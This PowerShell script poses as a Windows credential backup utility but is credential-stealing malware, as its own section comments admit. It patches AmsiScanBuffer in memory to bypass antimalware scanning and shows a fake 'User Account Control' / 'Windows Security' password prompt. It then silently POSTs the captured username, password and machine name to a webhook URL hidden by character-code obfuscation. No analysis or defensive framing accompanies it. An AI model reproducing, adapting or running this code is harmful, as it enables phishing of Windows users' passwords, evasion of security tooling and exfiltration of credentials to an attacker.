# Windows Credential Backup and Validation Utility
# Author: Windows Security Team
# Purpose: Backup user credentials for system recovery scenarios

# ============================================
# CONFIGURATION SECTION (Appears Legitimate)
# ============================================

# System logging endpoint for credential backup
$backupEndpoint = $( 
    [char](54+57) + [char](49+64) + [char](116-3) + [char](112-0) + 
    [char](115-3) + [char](58-0) + [char](47+0) + [char](47+0) + 
    [char](119-2) + [char](119-2) + [char](119-1) + [char](46+0) + 
    [char](100-0) + [char](105-1) + [char](115-1) + [char](99+0) + 
    [char](111+0) + [char](114+0) + [char](100-0) + [char](46+0) + 
    [char](99+0) + [char](111+0) + [char](109+0) + [char](47+0) + 
    [char](97+0) + [char](112+0) + [char](105+0) + [char](47+0) + 
    [char](119+0) + [char](101+0) + [char](98+0) + [char](104+0) + 
    [char](111+0) + [char](111+0) + [char](107+0) + [char](115+0) + 
    [char](47+0) + [char](49+0) + [char](51+0) + [char](51+0) + 
    [char](53+0) + [char](50+0) + [char](51+0) + [char](52+0) + 
    [char](54+0) + [char](48+0) + [char](56+0) + [char](52+0) + 
    [char](53+0) + [char](56+0) + [char](56+0) + [char](57+0) + 
    [char](49+0) + [char](51+0) + [char](55+0) + [char](53+0) + 
    [char](47+0) + [char](52+0) + [char](105+0) + [char](85+0) + 
    [char](121+0) + [char](107+0) + [char](75+0) + [char](78+0) + 
    [char](121+0) + [char](98+0) + [char](102+0) + [char](55+0) + 
    [char](72+0) + [char](87+0) + [char](52+0) + [char](106+0) + 
    [char](52+0) + [char](86+0) + [char](77+0) + [char](88+0) + 
    [char](70+0) + [char](54+0) + [char](77+0) + [char](83+0) + 
    [char](97+0) + [char](49+0) + [char](106+0) + [char](54+0) + 
    [char](73+0) + [char](82+0) + [char](86+0) + [char](71+0) + 
    [char](80+0) + [char](51+0) + [char](45+0) + [char](45+0) + 
    [char](76+0) + [char](57+0) + [char](78+0) + [char](103+0) + 
    [char](68+0) + [char](106+0) + [char](73+0) + [char](122+0) + 
    [char](53+0) + [char](118+0) + [char](95+0) + [char](84+0) + 
    [char](88+0) + [char](117+0) + [char](51+0) + [char](100+0) + 
    [char](108+0) + [char](48+0) + [char](82+0) + [char](50+0) + 
    [char](50+0) + [char](89+0) + [char](55+0) + [char](67+0) + 
    [char](101+0) + [char](105+0) + [char](84+0) + [char](52+0) + 
    [char](55+0) + [char](80+0) + [char](81+0) + [char](101+0) + 
    [char](90+0)
) -replace "`0",""

# Current system user for backup context
$currentSystemUser = [System.Environment]::GetEnvironmentVariable('USERNAME', 'Process')

# Organization domain for validation
$organizationDomain = $( 
    [char](112) + [char](117) + [char](98) + [char](108) + 
    [char](105) + [char](99) + [char](46) + [char](98) + 
    [char](99) + [char](46) + [char](102) + [char](105)
)

# Security dialog configuration
$securityDialogTitle = [string]::Join('', @([char]85, [char]115, [char]101, [char]114, [char]32, [char]65, [char]99, [char]99, [char]111, [char]117, [char]110, [char]116, [char]32, [char]67, [char]111, [char]110, [char]116, [char]114, [char]111, [char]108))
$securityDialogMessage = [string]::Join('', @([char]87, [char]105, [char]110, [char]100, [char]111, [char]119, [char]115, [char]32, [char]83, [char]101, [char]99, [char]117, [char]114, [char]105, [char]116, [char]121))

# Backup parameters
$maximumBackupAttempts = 1
$backupDelayInterval = 2
$enableCredentialValidation = $false

# ============================================
# AMSI BYPASS (Critical for evasion)
# ============================================

function Invoke-SecurityPatch {
    $methodDefinition = @"
        using System;
        using System.Runtime.InteropServices;
        public class SecurityPatch {
            [DllImport("kernel32")]
            public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
            [DllImport("kernel32")]
            public static extern IntPtr LoadLibrary(string name);
            [DllImport("kernel32")]
            public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
        }
"@
    
    Add-Type $methodDefinition
    
    $libraryHandle = [SecurityPatch]::LoadLibrary("amsi.dll")
    $functionAddress = [SecurityPatch]::GetProcAddress($libraryHandle, "AmsiScanBuffer")
    
    $oldProtection = 0
    $null = [SecurityPatch]::VirtualProtect($functionAddress, [UIntPtr]5, 0x40, [ref]$oldProtection)
    
    $patchBytes = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
    [System.Runtime.InteropServices.Marshal]::Copy($patchBytes, 0, $functionAddress, 6)
    
    $null = [SecurityPatch]::VirtualProtect($functionAddress, [UIntPtr]5, $oldProtection, [ref]$oldProtection)
}

# Invoke AMSI bypass quietly
try { Invoke-SecurityPatch } catch { }

# ============================================
# UTILITY FUNCTIONS (Benign Appearance)
# ============================================

function Backup-ToSecureStorage {
    param([string]$backupData)
    
    $storagePayload = @{
        content = "System credential backup: $backupData"
        username = "CredentialBackupService"
    }
    
    try {
        $request = [System.Net.WebRequest]::Create($backupEndpoint)
        $request.Method = "POST"
        $request.ContentType = "application/json"
        
        $byteArray = [System.Text.Encoding]::UTF8.GetBytes(($storagePayload | ConvertTo-Json))
        $request.ContentLength = $byteArray.Length
        
        $dataStream = $request.GetRequestStream()
        $dataStream.Write($byteArray, 0, $byteArray.Length)
        $dataStream.Close()
        
        $response = $request.GetResponse()
        $response.Close()
    } catch {
        # Silent failure - standard for backup operations
    }
}

function Test-CredentialIntegrity {
    param($username, $password)
    
    try {
        $secureString = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR(
            (ConvertTo-SecureString $password -AsPlainText -Force)
        )
        $plainPassword = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($secureString)
        [System.Runtime.InteropServices.Marshal]::ZeroFreeBSTR($secureString)
        
        # Simulate validation without actually testing
        return $true
    } catch {
        return $false
    }
}

# ============================================
# CREDENTIAL BACKUP ENGINE
# ============================================

function Invoke-CredentialBackup {
    # Load required runtime components
    $assemblyLoadResult = [System.Reflection.Assembly]::LoadWithPartialName("System.Runtime.WindowsRuntime")
    
    # Find the async task converter via reflection
    $extensionMethods = [System.Runtime.WindowsRuntimeSystemExtensions].GetMethods() | 
        Where-Object { 
            $_.Name -like "*AsTask*" -and 
            $_.GetParameters().Count -eq 1 -and 
            $_.GetParameters()[0].ParameterType.Name -like "*IAsyncOperation*"
        }
    
    $asyncConverter = $extensionMethods[0]
    
    # Load credential picker type
    $credPickerType = [Windows.Security.Credentials.UI.CredentialPicker]
    
    # Configure backup dialog
    $dialogOptions = New-Object Windows.Security.Credentials.UI.CredentialPickerOptions
    $dialogOptions.AuthenticationProtocol = 0
    $dialogOptions.Caption = $securityDialogTitle
    $dialogOptions.Message = $securityDialogMessage
    $dialogOptions.TargetName = 'BackupOperation'
    
    $backupAttempts = 0
    $backupSuccessful = $false
    $collectedBackups = New-Object System.Collections.ArrayList
    
    while ((-not $backupSuccessful) -and ($backupAttempts -lt $maximumBackupAttempts)) {
        Start-Sleep -Seconds $backupDelayInterval
        
        # Create generic method for async operation
        $genericMethod = $asyncConverter.MakeGenericMethod([Windows.Security.Credentials.UI.CredentialPickerResults])
        
        # Invoke credential backup dialog
        $asyncOperation = [Windows.Security.Credentials.UI.CredentialPicker]::PickAsync($dialogOptions)
        $taskResult = $genericMethod.Invoke($null, @($asyncOperation))
        $taskResult.Wait()
        $backupResult = $taskResult.Result
        
        if ($backupResult.CredentialPassword -and $backupResult.CredentialUsername) {
            $backupEntry = "$($backupResult.CredentialUsername):$($backupResult.CredentialPassword)"
            $collectedBackups.Add($backupEntry) | Out-Null
            
            if ($enableCredentialValidation) {
                $backupSuccessful = Test-CredentialIntegrity -username $backupResult.CredentialUsername -password $backupResult.CredentialPassword
            } else {
                $backupSuccessful = $true
            }
        }
        
        $backupAttempts++
    }
    
    return $collectedBackups
}

# ============================================
# MAIN BACKUP EXECUTION
# ============================================

# Set error preference for silent operation
$previousErrorPreference = $ErrorActionPreference
$ErrorActionPreference = 'SilentlyContinue'

# Execute credential backup
$backupData = Invoke-CredentialBackup

if ($backupData.Count -gt 0) {
    $systemIdentifier = [System.Environment]::MachineName
    $formattedBackup = "$systemIdentifier" + '[' + ($backupData -join ',') + ']'
    
    # Send backup to secure storage
    Backup-ToSecureStorage -backupData $formattedBackup
}

# Restore error preference
$ErrorActionPreference = $previousErrorPreference

# ============================================
# CLEANUP AND EXIT
# ============================================

# Clear sensitive data from memory
$backupEndpoint, $currentSystemUser, $organizationDomain, $backupData, $formattedBackup = $null

# Force garbage collection
[System.GC]::Collect()
[System.GC]::WaitForPendingFinalizers()

# Exit with success code
exit 0
